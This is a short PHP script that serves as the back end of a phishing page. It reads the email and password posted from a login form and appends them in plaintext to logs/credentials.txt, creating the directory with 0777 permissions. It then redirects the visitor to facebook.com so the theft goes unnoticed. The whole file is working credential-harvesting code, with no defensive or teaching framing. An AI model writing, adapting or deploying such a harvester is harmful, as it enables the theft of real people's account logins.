<?php
// Enable error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Validate inputs
if (empty($_POST['email']) || empty($_POST['password'])) {
    die("Error: Email and password are required!");
}

// Define file paths
$logDir = 'logs/'; 
$logFile = $logDir . 'credentials.txt'; 

// Create directory if missing
if (!is_dir($logDir)) {
    if (!mkdir($logDir, 0777, true)) {
        die("Failed to create directory: $logDir");
    }
}

// Log data
$logData = sprintf(
    "[%s] Email: %s | Password: %s\n",
    date('Y-m-d H:i:s'),
    $_POST['email'],
    $_POST['password']
);

// Write to file
try {
    $bytesWritten = file_put_contents($logFile, $logData, FILE_APPEND);
    if ($bytesWritten === false) {
        throw new Exception("Failed to write to file.");
    }
} catch (Exception $e) {
    die("Error writing file: " . $e->getMessage());
}

// Redirect AFTER all processing and NO output
header('Location: https://www.facebook.com');
exit;
?>